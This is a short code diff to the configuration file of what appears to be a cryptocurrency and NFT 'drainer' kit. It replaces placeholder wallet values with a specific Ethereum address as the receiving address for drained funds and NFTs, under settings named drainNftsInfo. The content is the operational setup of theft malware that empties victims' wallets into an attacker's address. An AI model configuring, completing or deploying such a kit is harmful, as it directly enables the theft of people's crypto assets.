@@ -2,7 +2,7 @@
     = = = = = YOU WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "YOUR WALLET";
+const receiveAddress = "0xAb9A173E3dB1794FE1d1070fe086b3c34A9FD760";
 
 /*
     = = = = = COLLECTION SETTINGS = = = = =
@@ -48,7 +48,7 @@ const drainNftsInfo = {
     active: true,
     minValue: 0.2,
     maxTransfer: 1,
-    nftReceiveAddress: "YOUR WALLET",
+    nftReceiveAddress: "0xAb9A173E3dB1794FE1d1070fe086b3c34A9FD760",
 }
 
 const customStrings = {
@@ -73,4 +73,5 @@ if (!receiveAddress.startsWith("0x") ||
     )
 ) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
 //#endregion
+
 
